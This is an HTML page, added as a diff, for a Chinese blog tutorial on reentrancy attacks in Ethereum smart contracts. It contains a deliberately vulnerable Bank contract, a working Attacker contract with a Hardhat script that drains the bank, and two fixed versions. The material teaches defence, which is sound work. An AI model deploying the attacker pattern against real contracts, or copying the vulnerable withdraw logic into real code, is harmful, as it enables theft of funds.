@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="概述重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，指黑客利用合约中存在的逻辑漏洞，在调用合约函数时，利用合约逻辑漏洞，反复调用合约的函数，并利用这种递归调用的机制，以欺骗合约的计算，从而使攻击者获得非法利益。 重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更改。攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约安全之重入攻击">
+<meta property="og:url" content="https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="悖论の小黑屋">
+<meta property="og:description" content="概述重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，指黑客利用合约中存在的逻辑漏洞，在调用合约函数时，利用合约逻辑漏洞，反复调用合约的函数，并利用这种递归调用的机制，以欺骗合约的计算，从而使攻击者获得非法利益。 重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更改。攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.otaku.ren/20230329/reentrancy.png">
+<meta property="article:published_time" content="2023-03-30T00:08:30.000Z">
+<meta property="article:modified_time" content="2024-08-07T17:52:34.071Z">
+<meta property="article:author" content="beilunyang">
+<meta property="article:tag" content="以太坊">
+<meta property="article:tag" content="区块链">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="智能合约">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.otaku.ren/20230329/reentrancy.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://www.gravatar.com/avatar/7386a5bf1f1b67ddfe8747d912582360">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/7386a5bf1f1b67ddfe8747d912582360" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/7386a5bf1f1b67ddfe8747d912582360">
+        
+      
+    
+    <!-- title -->
+    <title>智能合约安全之重入攻击</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/beilunyang">About</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/beilunyang">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/05/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/03/23/%E6%88%91%E7%94%A8ChatGPT%E5%92%8CMidjourney%E8%90%8C%E5%A8%98%E5%8C%96%E4%BA%86%E5%8C%BA%E5%9D%97%E9%93%BE%E5%92%8C%E8%99%9A%E6%8B%9F%E5%B8%81/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&text=智能合约安全之重入攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&is_video=false&description=智能合约安全之重入攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能合约安全之重入攻击&body=Check out this article: https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&title=智能合约安全之重入攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&name=智能合约安全之重入攻击&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://beilunyang.github.io/2023/03/30/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%B9%8B%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/&t=智能合约安全之重入攻击"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%A4%A7%E4%BA%8B%E4%BB%B6"><span class="toc-number">2.</span> <span class="toc-text">重大事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%BC%94%E7%A4%BA"><span class="toc-number">3.</span> <span class="toc-text">代码演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E5%A4%8D%E5%92%8C%E9%A2%84%E9%98%B2"><span class="toc-number">4.</span> <span class="toc-text">如何修复和预防</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5-%E7%94%9F%E6%95%88-%E4%BA%A4%E4%BA%92%EF%BC%88checks-effect-interaction%EF%BC%89"><span class="toc-number">4.1.</span> <span class="toc-text">检查-生效-交互（checks-effect-interaction）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%85%A5%E9%94%81"><span class="toc-number">4.2.</span> <span class="toc-text">重入锁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">5.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%BB%93%E5%BA%93"><span class="toc-number">6.</span> <span class="toc-text">代码仓库</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        智能合约安全之重入攻击
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">beilunyang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-30T00:08:30.000Z" class="dt-published" itemprop="datePublished">2023-03-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/" rel="tag">以太坊</a>, <a class="p-category" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a>, <a class="p-category" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a>, <a class="p-category" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="tag">智能合约</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，指黑客利用合约中存在的逻辑漏洞，在调用合约函数时，利用合约逻辑漏洞，反复调用合约的函数，并利用这种递归调用的机制，以欺骗合约的计算，从而使攻击者获得非法利益。</p>
+<p>重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更改。攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个函数(如: <code>fallback</code>, <code>receive</code>)，从而让攻击者在合约中获得额外的资产或信息。</p>
+<h2 id="重大事件"><a href="#重大事件" class="headerlink" title="重大事件"></a>重大事件</h2><ul>
+<li>2016年，The DAO合约被重入攻击，被盗取3,600,000枚ETH。从而导致了以太坊进行硬分叉，分叉成以太坊和以太坊经典</li>
+<li>2019年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 <code>sETH</code>。</li>
+<li>2020年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。</li>
+<li>2021年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。</li>
+<li>2022年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。</li>
+</ul>
+<h2 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h2><p>这里我使用hardhat创建合约工程。Bank为被攻击者合约，Attacker为攻击者合约。ts脚本模拟整个攻击流程。</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.6</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Bank</span> &#123;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint val</span>) external &#123;</span><br><span class="line">    <span class="built_in">require</span>(val &lt;= balances[msg.<span class="property">sender</span>], <span class="string">&quot;Insufficient balance&quot;</span>);</span><br><span class="line">    (bool success, ) = msg.<span class="property">sender</span>.<span class="property">call</span>&#123;<span class="attr">value</span>: val&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (success) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;withdraw successfully&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">require</span>(success, <span class="string">&quot;Failed to withdraw&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    balances[msg.<span class="property">sender</span>] -= val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attacker</span> &#123;</span><br><span class="line">  <span class="title class_">Bank</span> bank;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address attacked</span>) payable &#123;</span><br><span class="line">    bank = <span class="title class_">Bank</span>(attacked);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) external &#123;</span><br><span class="line">    bank.<span class="property">deposit</span>&#123;<span class="attr">value</span>: <span class="number">1</span> ether&#125;();</span><br><span class="line">    bank.<span class="title function_">withdraw</span>(<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;receive&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">address</span>(bank).<span class="property">balance</span> &gt; <span class="number">1</span> ether) &#123;</span><br><span class="line">      bank.<span class="title function_">withdraw</span>(<span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;hardhat&quot;</span>;</span><br><span class="line"></span><br><span class="line">(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [account1, account2] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Bank</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;Bank&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> bank = <span class="keyword">await</span> <span class="title class_">Bank</span>.<span class="title function_">connect</span>(account2).<span class="title function_">deploy</span>(&#123; <span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;30&#x27;</span>) &#125;);</span><br><span class="line">  <span class="keyword">await</span> bank.<span class="title function_">deployed</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The address of the bank contract is:&quot;</span>, bank.<span class="property">address</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Attacker</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;Attacker&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> attacker = <span class="keyword">await</span> <span class="title class_">Attacker</span>.<span class="title function_">connect</span>(account1).<span class="title function_">deploy</span>(bank.<span class="property">address</span>, &#123; <span class="attr">value</span>: ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;1&#x27;</span>) &#125;);</span><br><span class="line">  <span class="keyword">await</span> attacker.<span class="title function_">deployed</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The address of the attacker contract is:&quot;</span>, attacker.<span class="property">address</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> attacker.<span class="title function_">attack</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="attr">err</span>: <span class="built_in">any</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(bank.<span class="property">address</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;The balance of bank is:&#x27;</span>, balance);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;The balance of attacker is:&#x27;</span>, <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(attacker.<span class="property">address</span>));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>恶意攻击者部署attacker合约，并调用attack合约函数</li>
+<li>attack合约函数向bank合约<code>deposit 1eth</code>，此时，bank合约的<code>balances</code>中会记录attacker合约的存款数</li>
+<li>attacker合约向bank合约<code>withdraw  1eth</code>， 由于<code>balances[msg.sender] === 1eth</code>, 顺利通过bank合约的余额判断，执行<code>msg.sender.call</code>, 向attacker合约转账，触发attacker合约的<code>receive</code>函数，然而<code>receive</code>函数却再次调用bank合约的<code>withdraw</code>, 从而形成了<strong>重入（递归调用）</strong></li>
+</ol>
+<p><img src="https://img.otaku.ren/20230329/reentrancy.png" alt="reentrancy.png"></p>
+<h2 id="如何修复和预防"><a href="#如何修复和预防" class="headerlink" title="如何修复和预防"></a>如何修复和预防</h2><p>目前主要通过两种方式修复和预防重入攻击，检查-生效-交互模式和重入锁</p>
+<h3 id="检查-生效-交互（checks-effect-interaction）"><a href="#检查-生效-交互（checks-effect-interaction）" class="headerlink" title="检查-生效-交互（checks-effect-interaction）"></a>检查-生效-交互（checks-effect-interaction）</h3><p>检查-生效-交互模式是指，编写合约函数时</p>
+<ol>
+<li>先检查状态是否满足条件。以Bank合约为例，即 <code>require(val &lt;= balances[msg.sender], &quot;Insufficient balance&quot;);</code></li>
+<li>再更新状态。以Bank合约为例，即 <code>balances[msg.sender] -= val;</code></li>
+<li>最后再和其它合约进行交互。以Bank合约为例，即<code>(bool success, ) = msg.sender.call&#123;value: val&#125;(&quot;&quot;);</code></li>
+</ol>
+<p>以下为通过检查-生效-交互模式修复的Bank合约</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.6</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Bank</span> &#123;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint val</span>) external &#123;</span><br><span class="line">    <span class="comment">// 检查</span></span><br><span class="line">    <span class="built_in">require</span>(val &lt;= balances[msg.<span class="property">sender</span>], <span class="string">&quot;Insufficient balance&quot;</span>);</span><br><span class="line">    <span class="comment">// 生效</span></span><br><span class="line">    balances[msg.<span class="property">sender</span>] -= val;</span><br><span class="line">    <span class="comment">// 交互</span></span><br><span class="line">    (bool success, ) = msg.<span class="property">sender</span>.<span class="property">call</span>&#123;<span class="attr">value</span>: val&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (success) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;withdraw successfully&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">require</span>(success, <span class="string">&quot;Failed to withdraw&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="重入锁"><a href="#重入锁" class="headerlink" title="重入锁"></a>重入锁</h3><p>在solidity合约开发中，重入锁是一种防止重入函数的修饰器（modifier）。它通过一个默认为<code>0</code><br>的状态变量<code>_status</code> 来控制被修饰函数是否应该被顺利执行。被重入锁修饰的函数，在第一次调用时会检查<code>_status</code>是否为<code>0</code>，紧接着将<code>_status</code>的值设置为<code>1</code>，调用结束后再将<code>_status</code>改为<code>0</code>。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击就失败了</p>
+<p>以下为通过重入锁修复的Bank合约</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.6</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Bank</span> &#123;</span><br><span class="line">  uint8 <span class="keyword">private</span> _status;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 重入锁</span></span><br><span class="line">  modifier <span class="title function_">nonReentrant</span>(<span class="params"></span>) &#123;</span><br><span class="line">	  <span class="built_in">require</span>(_status == <span class="number">0</span>, <span class="string">&quot;Reentrant call&quot;</span>);</span><br><span class="line">	  _status = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	  _;</span><br><span class="line">    </span><br><span class="line">	  _status = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint val</span>) external nonReentrant &#123;</span><br><span class="line">    <span class="built_in">require</span>(val &lt;= balances[msg.<span class="property">sender</span>], <span class="string">&quot;Insufficient balance&quot;</span>);</span><br><span class="line">    (bool success, ) = msg.<span class="property">sender</span>.<span class="property">call</span>&#123;<span class="attr">value</span>: val&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (success) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;withdraw successfully&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">require</span>(success, <span class="string">&quot;Failed to withdraw&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    balances[msg.<span class="property">sender</span>] -= val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
